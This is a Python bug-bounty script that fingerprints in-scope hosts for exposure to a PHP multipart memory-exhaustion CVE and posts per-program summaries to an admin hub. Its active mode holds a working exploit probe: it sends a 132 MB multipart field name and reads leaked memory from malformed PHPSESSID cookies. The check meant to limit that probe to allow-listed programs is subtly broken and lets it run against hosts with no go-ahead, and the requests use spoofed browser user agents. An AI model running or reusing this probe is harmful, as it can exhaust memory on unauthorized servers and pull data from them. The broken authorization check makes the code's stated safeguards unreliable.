#!/usr/bin/env python3
"""php2shell-watch — PHP2Shell (CVE-2026-109618 / CVE-2026-109619) exposure mapper.

CVE-2026-109618/109619: pre-auth RCE + memory disclosure on ANY PHP >= 5.4.0
(multipart/form-data memory-exhaustion -> cross-request UAF). Disclosed
2026-10-21 14:00 UTC. PHP fixed only 8.2+; <= 8.1 has NO fix.

PASSIVE mode (default, safe):
  1. Parse every /root/bbscans/<Program>/live.txt (httpx tech-detect) for
     PHP tokens, plus urls.txt (wayback) for .php endpoints per host.
  2. Keep only hosts that pass the program's scope.json (in_scope).
  3. Fingerprint each unique host with GET / (browser UA, 1 rps): capture
     X-Powered-By PHP version, PHPSESSID cookies, .php endpoint liveness.
  4. Classify: EOL branch / no-fix branch (<=8.1) = likely-vulnerable;
     8.2+ = patch-level verify (fix released 2026-10-21); unversioned =
     php-signal-only.
  5. Post one summary per affected program to the hub /api/admin/cyber queue
     (offlineOnly=True: no exploit attempted, version-based exposure only).

ACTIVE mode (--active, NEVER default): single-request CVE-2026-109618
upload-progress leak probe (oversized multipart field name -> anomalous
PHPSESSID cookie = memory-disclosure evidence). Requires the program in
/opt/bounty/active-allow.json (Preston's explicit per-program go-ahead) and
not in policy-blacklist. One request per host, SCAN_RPS rate limit.

Usage: php2shell-watch.py [--active] [--limit N] [--dry]
"""
import json, os, re, sys, time, urllib.request, urllib.error, pathlib, random

BASE = pathlib.Path("/opt/bounty")
SCANS = pathlib.Path("/root/bbscans")
HUB = "https://jobhunter.prestonzen.com"
TOKEN = pathlib.Path("/etc/hub-admin-token").read_text().strip()
REPORT = SCANS / "php2shell-report.jsonl"
ALLOW = BASE / "active-allow.json"
BLACKLIST = BASE / "policy-blacklist.json"
STATE = BASE / "php2shell-watch.state.json"
UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"}
ANSI = re.compile(r"\x1b\[[0-9;]*m")
PHP_VER = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)", re.I)

ACTIVE = "--active" in sys.argv
DRY = "--dry" in sys.argv
LIMIT = 0
if "--limit" in sys.argv:
    LIMIT = int(sys.argv[sys.argv.index("--limit") + 1])
RPS = float(os.environ.get("SCAN_RPS", "1"))

safe = lambda s: re.sub(r"[^A-Za-z0-9]+", "-", s).strip("-")


def load_scope(program_dir: pathlib.Path):
    f = program_dir / "scope.json"
    if not f.is_file():
        return None
    sys.path.insert(0, str(BASE))
    import scope
    return json.loads(f.read_text()), scope.in_scope


def parse_live(program_dir: pathlib.Path):
    """Return list of (host_url, has_php_tech)."""
    out = []
    f = program_dir / "live.txt"
    if not f.is_file():
        return out
    for ln in f.read_text(errors="replace").splitlines():
        ln = ANSI.sub("", ln).strip()
        if not ln.startswith("http"):
            continue
        parts = re.split(r"\] \[|\[|\]", ln)
        # parts: url, status, maybe title, maybe tech
        url = parts[0].strip()
        joined = " ".join(parts[1:]).lower()
        tech = ",".join(p for p in parts[2:] if p).lower() if len(parts) > 2 else joined
        # PHP token, or WordPress (which implies a PHP runtime — version unverified)
        has_php = bool(re.search(r"(?:^|[,\s])php(?::[\d.]+)?(?:[,\s]|$)", joined)) or "wordpress" in joined or ".php" in url.lower()
        out.append((url, has_php))
    return out


def parse_php_endpoints(program_dir: pathlib.Path):
    """host -> one sample .php url from wayback harvest."""
    out = {}
    f = program_dir / "urls.txt"
    if not f.is_file():
        return out
    for ln in f.read_text(errors="replace").splitlines():
        ln = ln.strip()
        if ".php" not in ln.lower() or not ln.startswith("http"):
            continue
        m = re.match(r"(https?://[^/]+)", ln)
        if m and m.group(1) not in out and "?" not in ln:
            out[m.group(1)] = ln
    return out


def http_get(url: str, timeout=8):
    req = urllib.request.Request(url, headers=UA)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return {"status": r.status, "headers": dict(r.headers)}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "headers": dict(e.headers)}
    except Exception:
        return {"status": 0, "headers": {}}


def classify(version):
    if not version:
        return "php-signal-unversioned"
    major, minor, _ = version
    if major < 8 or (major == 8 and minor in (0, 1)):
        return "likely-vulnerable (branch has no fix)"
    return "patch-verify (8.2+; fix released 2026-10-21)"


def probe_leak(url: str, payload_mb: int = 132, timeout=150):
    """CVE-2026-109618 upload-progress leak probe: one oversized multipart
    field name; an anomalous (long/non-hex) PHPSESSID Set-Cookie = leak."""
    boundary = "----php2shellwatch"
    name = b"A" * (payload_mb * 1024 * 1024)
    head = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"".encode()) + name + b"\"\r\n\r\n\r\n"
    tail = f"\r\n--{boundary}--\r\n".encode()

    def body():
        yield head
        yield tail

    class Stream:
        def __init__(self):
            self._it = body()
        def read(self, n=-1):
            try:
                return next(self._it)
            except StopIteration:
                return b""
        def __len__(self):
            return len(head) + len(tail)

    req = urllib.request.Request(
        url, data=Stream(), method="POST",
        headers={**UA, "Content-Type": f"multipart/form-data; boundary={boundary}",
                 "Content-Length": str(len(head) + len(tail))})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            sc = [v for k, v in r.headers.items() if k.lower() == "set-cookie"]
            return r.status, sc
    except urllib.error.HTTPError as e:
        sc = [v for k, v in e.headers.items() if k.lower() == "set-cookie"]
        return e.code, sc
    except Exception:
        return 0, []


def enqueue(payload):
    req = urllib.request.Request(HUB + "/api/admin/cyber", data=json.dumps(payload).encode(),
        headers={"Authorization": "Bearer " + TOKEN, "Content-Type": "application/json",
                 "User-Agent": "curl/8.5.0"})
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.load(r)


def main():
    state = json.loads(STATE.read_text()) if STATE.is_file() else {"fingerprinted": {}}
    fp_done = state.get("fingerprinted", {})  # host -> result dict

    queue = json.loads((BASE / "queue.json").read_text())["programs"]
    blocked = set()
    if BLACKLIST.is_file():
        raw = json.loads(BLACKLIST.read_text())
        rows = raw if isinstance(raw, list) else raw.get("programs", []) if isinstance(raw, dict) else []
        for r in rows:
            blocked.add((r if isinstance(r, str) else str(r.get("program") or r.get("name") or "")).lower())
    allow_active = set()
    if ACTIVE and ALLOW.is_file():
        allow_active = {str(x).lower() for x in json.loads(ALLOW.read_text())}

    # Collect candidates: host -> {"programs": {program: platform}, "php_url": str|None}
    candidates = {}
    for p in queue:
        prog, plat = p["program"].strip(), p.get("platform", "unknown")
        if p.get("automation") != "default-allow" or prog.lower() in blocked:
            continue
        pd = SCANS / safe(prog)
        scope_rules = load_scope(pd)
        if not scope_rules:
            continue
        rules, in_scope = scope_rules
        php_urls = parse_php_endpoints(pd)
        for url, has_php in parse_live(pd):
            # Fingerprint every in-scope host: PHP behind a CDN shows no
            # tech-detect token, so X-Powered-By / PHPSESSID cookies are
            # the real signal. httpx found only ~3 PHP techs in 466 hosts.
            if not in_scope(url, rules):
                continue
            host = re.match(r"(https?://[^/]+)", url)
            if not host:
                continue
            h = host.group(1)
            c = candidates.setdefault(h, {"programs": {}, "php_url": None, "tech_php": has_php})
            c["programs"][prog] = plat
            c["tech_php"] = c["tech_php"] or has_php
            if h in php_urls:
                c["php_url"] = php_urls[h]

    print(f"[php2shell-watch] {len(candidates)} in-scope PHP-signal hosts across {len(queue)} programs")

    fresh, results = 0, []
    for host, c in candidates.items():
        if LIMIT and fresh >= LIMIT:
            break
        rec = fp_done.get(host)
        if not rec:
            r = http_get(host + "/")
            headers = {k.lower(): v for k, v in (r["headers"] or {}).items()}
            powered = headers.get("x-powered-by", "")
            m = PHP_VER.search(powered)
            version = (int(m.group(1)), int(m.group(2)), int(m.group(3))) if m else None
            rec = {"version": ".".join(map(str, version)) if version else None,
                   "status": r["status"], "powered_by": powered or None,
                   "phpsessid_root": "phpsessid" in headers.get("set-cookie", "").lower(),
                   "checked": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}
            if c["php_url"]:
                r2 = http_get(c["php_url"])
                h2 = {k.lower(): v for k, v in (r2["headers"] or {}).items()}
                m2 = PHP_VER.search(h2.get("x-powered-by", ""))
                if m2 and not rec["version"]:
                    rec["version"] = ".".join(m2.groups())
                rec["php_endpoint_status"] = r2["status"]
                rec["phpsessid_endpoint"] = "phpsessid" in h2.get("set-cookie", "").lower()
            elif c.get("tech_php") and not rec["version"]:
                # WordPress/PHP apps: wp-login.php is a standard public page;
                # its headers sometimes carry the PHP version.
                r3 = http_get(host + "/wp-login.php")
                h3 = {k.lower(): v for k, v in (r3["headers"] or {}).items()}
                m3 = PHP_VER.search(h3.get("x-powered-by", ""))
                if m3:
                    rec["version"] = ".".join(m3.groups())
                rec["wp_login_status"] = r3["status"]
            rec["php_signal"] = bool(version or rec["phpsessid_root"] or rec.get("phpsessid_endpoint")
                                     or (rec["powered_by"] and ("php" in rec["powered_by"].lower() or "wp engine" in rec["powered_by"].lower()))
                                     or c.get("tech_php") or ".php" in host.lower())
            rec["cls"] = classify(version) if rec["php_signal"] else "no-php-signal"
            fp_done[host] = rec
            fresh += 1
            time.sleep(max(0.0, 1.0 / RPS - 0.2) + random.random() * 0.2)
        results.append((host, c, rec))

    state["fingerprinted"] = fp_done
    if not DRY:
        STATE.write_text(json.dumps(state))

    # Per-program rollup + hub post (PHP-signal hosts only)
    per_prog = {}
    negatives = 0
    for host, c, rec in results:
        if not rec.get("php_signal"):
            negatives += 1
            continue
        for prog, plat in c["programs"].items():
            per_prog.setdefault(prog, {"platform": plat, "hosts": []})
            per_prog[prog]["hosts"].append((host, rec))

    vulnerable = {h for h, _, r in results if r["cls"].startswith("likely-vulnerable")}
    patchverify = {h for h, _, r in results if r["cls"].startswith("patch-verify")}
    unversioned = {h for h, _, r in results if r["cls"] == "php-signal-unversioned"}
    print(f"[php2shell-watch] php-signal: {len(vulnerable) + len(patchverify) + len(unversioned)} "
          f"(likely-vulnerable {len(vulnerable)}, patch-verify {len(patchverify)}, unversioned {len(unversioned)}) "
          f"| no-php-signal: {negatives} | new fingerprints: {fresh}")

    for prog, d in sorted(per_prog.items()):
        hosts = d["hosts"]
        lv = [h for h, r in hosts if r["cls"].startswith("likely-vulnerable")]
        pv = [h for h, r in hosts if r["cls"].startswith("patch-verify")]
        uv = [h for h, r in hosts if r["cls"] == "php-signal-unversioned"]
        if not (lv or pv or uv):
            continue
        evidence = (
            "PHP2Shell exposure map (CVE-2026-109618/109619) — PASSIVE fingerprinting only, no exploit attempted.\n"
            "Pre-auth RCE on PHP >= 5.4.0 via multipart memory exhaustion; fix released 2026-10-21 for 8.2+ ONLY.\n"
            f"Program totals: {len(lv)} likely-vulnerable (EOL/no-fix branch), {len(pv)} patch-verify (8.2+), {len(uv)} php-signal-unversioned.\n"
            "Likely-vulnerable hosts:\n" + "\n".join(lv[:25]) +
            ("\nPatch-verify hosts:\n" + "\n".join(pv[:15]) if pv else "") +
            ("\nUnversioned PHP-signal hosts (runtime confirmed, version hidden):\n" + "\n".join(uv[:25]) if uv else "") +
            "\nNext: confirm patch level per host, then report via the engage/Dark-Moon pipeline (draft-only for Preston).")
        try:
            if not DRY:
                enqueue({"sourceKey": f"php2shell:passive:{safe(prog)}:{time.strftime('%Y%m%d')}"[:180],
                         "program": prog, "platform": d["platform"],
                         "target": "PHP exposure map (CVE-2026-109618/109619)",
                         "source": "php2shell-watch CT134 (passive fingerprint)",
                         "offlineOnly": True, "evidence": evidence})
            print(f"[php2shell-watch] posted {prog}: lv={len(lv)} pv={len(pv)} uv={len(uv)}" + (" [dry]" if DRY else ""))
        except Exception as e:
            print(f"[php2shell-watch] enqueue failed {prog}: {e}", file=sys.stderr)

    # Active leak probe (gated)
    if ACTIVE:
        did = 0
        for host, c, rec in results:
            if not rec.get("php_signal"):
                continue
            progs = [p for p in c["programs"] if p.lower() in allow_active]
            if any(c["programs"][p].lower() in ("", "unknown") for p in progs):
                continue
            code, cookies = probe_leak(host + "/")
            anomaly = any(("phpsessid" in ck.lower()) and (len(ck.split("=", 1)[-1].split(";")[0]) > 64 or not re.fullmatch(r"[a-f0-9]+", ck.split("=", 1)[-1].split(";")[0].strip()[:64], re.I))
                          for ck in cookies)
            print(f"[php2shell-watch] ACTIVE probe {host} -> {code}, leak={'YES' if anomaly else 'no'}")
            did += 1
            time.sleep(max(0.0, 1.0 / RPS))
        print(f"[php2shell-watch] active probes: {did}")


if __name__ == "__main__":
    main()
